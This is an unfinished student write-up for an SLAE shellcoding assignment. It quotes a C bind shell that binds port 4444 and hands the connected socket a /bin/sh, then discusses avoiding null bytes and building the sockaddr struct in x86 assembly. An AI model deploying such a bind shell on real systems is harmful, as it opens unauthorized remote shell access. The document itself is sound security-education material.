# WIP

## Assignment 1 - Bind Shell

### What does a Bind Shell need to do?

A high level overview of a Bind Shell is that it creates a socket, binds that socket to a port, listens for a connection, accepts a connect, then execs /bin/sh (or another shell) and duplicates STDIN, STDOUT, and STDERR to the file descriptor of the connected socket. One of my favorite resources for shellcoding is the tutorial series by Azeria Labs for exploitation on the ARM architecture. I outlined what my shellcode needed to accomplish by looking at Azeria's C version of a [bind shell](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/):
```C
    // Create new TCP socket 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize sockaddr struct to bind socket using it 
    hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order

    // Bind socket to IP/Port in sockaddr struct 
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    // Listen for incoming connections 
    listen(host_sockid, 2); 

    // Accept incoming connection 
    client_sockid = accept(host_sockid, NULL, NULL); 

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 

    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid);
```

### The Process
Writing unobfuscated shellcode in x86 assembly is straightforward. It consists of moving the appropriate values into registers for a series of system calls. A quick ```man 2 syscall``` reveals the calling convention and Application Binary Interface (ABI). However, a few issues require some forethought: 
1. Avoiding null bytes (0x00) or other bad characters if needed
    - XOR a register with itself to zero it out, e.g. ```xor eax, eax``` instead of ```mov eax, 0```
    - Write to 8- or 16-bit registers to avoid leading zeros, e.g. ```mov al, 10``` instead of ```mov eax, 10```
2. Building a *sockaddr* struct on the stack
3. Strings, because our code is position independent

### Headache #1 - Building a sockaddr
Re-write this better later: I tripped over the ```struct sockaddr *``` required as the second argument to the *bind* syscall. What order were the address family, port, and IP address to be passed? Where was the padding?

I used a "Guess and Check" approach, writing assembly to build various permutations of this on the stack:

| value     | location  | meaning               |
|------     | --------- | -----                 |
|0x02005555 | rsp       | AF\_INET, port 0x5555 |
|0x00000000 | rsp + 4   | INADDR\_ANY           |

This *seemed* right. When I compiled and ran ```printf("size = %d\n", sizeof(struct sockaddr));``` and saw the struct consisted of 16 bytes, I came to the conclusion that it should be built on the stack with exactly two 32-bit values, accounting for endianness and padding. Sadly, I got stuck at this juncture and looked for how someone else did it:

Another SLAE student [https://github.com/ricardojoserf/slae32/tree/master/a1_Shell_Bind_Tcp](https://github.com/ricardojoserf/slae32/tree/master/a1_Shell_Bind_Tcp)
pushed first the IPv4 address, then the port number as a *word*, and lastly the *sin\_family* as a *word*.  
